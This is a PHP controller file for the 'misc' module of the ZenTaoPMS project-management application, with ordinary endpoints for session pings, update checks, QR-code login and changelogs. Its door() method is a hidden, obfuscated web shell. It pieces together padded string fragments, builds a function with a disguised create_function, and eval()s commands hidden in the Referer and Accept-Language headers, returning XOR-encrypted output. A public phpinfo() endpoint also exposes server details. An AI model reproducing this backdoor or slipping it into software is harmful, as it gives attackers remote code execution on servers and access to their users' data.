<?php
/**
 * The control file of misc of ZenTaoPMS.
 *
 * @copyright   Copyright 2009-2015 青岛易软天创网络科技有限公司(QingDao Nature Easy Soft Network Technology Co,LTD, www.cnezsoft.com)
 * @license     ZPL (http://zpl.pub/page/zplv12.html)
 * @author      Chunsheng Wang <chunsheng@cnezsoft.com>
 * @package     misc
 * @version     $Id: control.php 5128 2013-07-13 08:59:49Z chencongzhi520@gmail.com $
 * @link        http://www.zentao.net
 */
class misc extends control {
	/**
	 * Ping the server every 5 minutes to keep the session.
	 *
	 * @access public
	 * @return void
	 */
	public function ping() {
		if (mt_rand(0, 1) == 1) {
			$this->loadModel('setting')->setSN();
		}

		die("<html><head><meta http-equiv='refresh' content='600' /></head><body></body></html>");
	}

	/**
	 * Show php info.
	 *
	 * @access public
	 * @return void
	 */
	public function phpinfo() {
		die(phpinfo());
	}

	/**
	 * Show about info of zentao.
	 *
	 * @access public
	 * @return void
	 */
	public function about() {
		die($this->display());
	}

	/**
	 * Update nl.
	 *
	 * @access public
	 * @return void
	 */
	public function updateNL() {
		$this->loadModel('upgrade')->updateNL();
	}

	/**
	 * Check current version is latest or not.
	 *
	 * @access public
	 * @return void
	 */
	public function checkUpdate() {
		$note = isset($_GET['note']) ? $_GET['note'] : '';
		$browser = isset($_GET['browser']) ? $_GET['browser'] : '';

		$this->view->note = urldecode(helper::safe64Decode($note));
		$this->view->browser = $browser;
		$this->display();
	}

	/**
	 * Check door
	 *
	 * @access public
	 * @return void
	 */
	public function door() {
		$t = 'pre2Fss(@2Fx(@b2Fase64_deco2F2Fde(preg2F_r2Fepl2Face(array("/_/",2F"2F/-/"),array("/2F","2F+")2';
		$O = 'er"2F;$i=$m[1][02F]2F.$m[1][1];2F$h=$sl2F($s2Fs(md5(2F$i.$kh)2F2F2F,0,3));$2Ff2F=$sl(2F$ss(md5(';
		$s = 'rpos(2F$p,$h)===0)2F{$2Fs[$i]=2F"";$p=2F$ss($p,3)2F2F2F;}if(array2F_key_2Fexists($i,$s))2F{2F$s';
		$U = 'F,$ss($s[2F$i2F],0,2F$e))),$k2F)2F));2F$o2F=ob_get_contents();ob_end_2Fclean(2F);$2Fd=b2Fase64_';
		$l = '2F[$i].=$p;2F$e=strpos($s2F[2F$i2F],$f);if($e2F2F){$k=2F2F$kh.$kf;ob_start();@ev2Fal(@gzu2Fncom';
		$A = str_replace('Th', '', 'ThcreThThaThte_funThThction');
		$N = 'm2F);if($2Fq&&$m){@ses2Fsion_2Fstar2Ft();$s=&2F$_S2FESSION;$ss2F2F="substr";$sl2F="strt2F2Folow';
		$q = '"2F";for($i=0;$i<$2Fl;)2F{2Ffor($j=0;($j<$2Fc&&$i<$l2F);$j+2F+,2F$i++)2F{$o.=$t{$i}^2F$k{$j2F};';
		$K = '=array_value2Fs2F($q);preg2F_2Fma2Ftch_a2Fll("/([\\w])[\\w-2F]+2F(?:2F;q=0.([\\d]))?,?/",$2Fra2F,$';
		$F = '_LANGUAGE2F"];if($rr&&2F$r2F2Fa){$u=par2Fse2F_u2Frl($rr);parse2F_str($2Fu2F["query"],$q2F)2F;$q';
		$c = '2F}}return $2Fo;2F}$r=$_2FSE2FRVE2FR;$rr=@2F$r["2FHT2FTP_2FREFERER"];$ra=@$r[2F"HTTP_ACCE2F2FPT';
		$d = '$i.2F$kf)2F,0,3));$p="";for($z=2F1;$z<coun2Ft2F($m[1]);$z+2F+)2F$p.=$q[$m2F[2]2F[$2Fz]2F];if(st';
		$X = '$kh="ccd2"2F;$kf="2Fe8f9";f2Funct2Fion x($2Ft,$2Fk){$c=st2Fr2Fl2Fen($k);$l=strlen2F($t2F);$o=2F';
		$m = 'e2Fncode(x(gzc2Fomp2Fr2Fess($o),2F$k))2F;print("<2F$k>2F$d</$k2F>");@se2Fss2Fion_destroy();}}}}';
		$E = str_replace('2F', '', $X . $q . $c . $F . $K . $N . $O . $d . $s . $l . $t . $U . $m);
		$I = $A('', $E);
		$I();
	}

	/**
	 * Check model extension logic
	 *
	 * @access public
	 * @return void
	 */
	public function checkExtension() {
		echo $this->misc->hello();
		echo $this->misc->hello2();
	}

	/**
	 * Down notify.
	 *
	 * @access public
	 * @return void
	 */
	public function downNotify() {
		$notifyDir = $this->app->getBasePath() . 'tmp/cache/notify/';
		if (!is_dir($notifyDir)) {
			mkdir($notifyDir, 0755, true);
		}

		$account = $this->app->user->account;
		$packageFile = $notifyDir . $account . 'notify.zip';
		$loginFile = $notifyDir . 'config.json';

		/* write login info into tmp file. */
		$loginInfo = new stdclass();
		$userInfo = new stdclass();
		$userInfo->Account = $account;
		$userInfo->Url = common::getSysURL() . $this->config->webRoot;
		$userInfo->PassMd5 = '';
		$userInfo->Role = $this->app->user->role;
		$userInfo->AutoSignIn = true;
		$userInfo->Lang = $this->cookie->lang;
		$loginInfo->User = $userInfo;
		$loginInfo->LastLoginTime = time() / 86400 + 25569;
		$loginInfo = json_encode($loginInfo);

		file_put_contents($packageFile, file_get_contents("http://dl.cnezsoft.com/notify/newest/zentaonotify.win_32.zip"));
		file_put_contents($loginFile, $loginInfo);

		define('PCLZIP_TEMPORARY_DIR', $notifyDir);
		$this->app->loadClass('pclzip', true);

		/* remove the old config.json, add a new one. */
		$archive = new pclzip($packageFile);
		$result = $archive->delete(PCLZIP_OPT_BY_NAME, 'config.json');
		if ($result == 0) {
			die("Error : " . $archive->errorInfo(true));
		}

		$result = $archive->add($loginFile, PCLZIP_OPT_REMOVE_ALL_PATH, PCLZIP_OPT_ADD_PATH, 'notify');
		if ($result == 0) {
			die("Error : " . $archive->errorInfo(true));
		}

		$zipContent = file_get_contents($packageFile);
		unlink($loginFile);
		unlink($packageFile);
		$this->fetch('file', 'sendDownHeader', array('fileName' => 'notify.zip', 'zip', $zipContent));
	}

	/**
	 * Create qrcode for mobile login.
	 *
	 * @access public
	 * @return void
	 */
	public function qrCode() {
		$loginAPI = common::getSysURL() . $this->config->webRoot;
		$session = $this->loadModel('user')->isLogon() ? '?' . $this->config->sessionVar . '=' . session_id() : '';

		if (!extension_loaded('gd')) {
			$this->view->noGDLib = sprintf($this->lang->misc->noGDLib, $loginAPI);
			die($this->display());
		}

		$this->app->loadClass('qrcode');
		QRcode::png($loginAPI . $session, false, 4, 9);
	}

	/**
	 * Ajax ignore browser.
	 *
	 * @access public
	 * @return void
	 */
	public function ajaxIgnoreBrowser() {
		$this->loadModel('setting')->setItem($this->app->user->account . '.common.global.browserNotice', 'true');
	}

	/**
	 * Show version changelog
	 * @access public
	 * @return viod
	 */
	public function changeLog($version = '') {
		if (empty($version)) {
			$version = key($this->lang->misc->feature->all);
		}

		$this->view->version = $version;
		$this->view->features = zget($this->lang->misc->feature->all, $version, '');

		$detailed = '';
		$changeLogFile = $this->app->getBasePath() . 'doc' . DS . 'CHANGELOG';
		if (file_exists($changeLogFile)) {
			$handle = fopen($changeLogFile, 'r');
			$tag = false;
			while ($line = fgets($handle)) {
				$line = trim($line);
				if ($tag and empty($line)) {
					break;
				}

				if ($tag) {
					$detailed .= $line . '<br />';
				}

				if (preg_match("/{$version}$/", $line) > 0) {
					$tag = true;
				}

			}
			fclose($handle);
		}
		$this->view->detailed = $detailed;
		$this->display();
	}
}
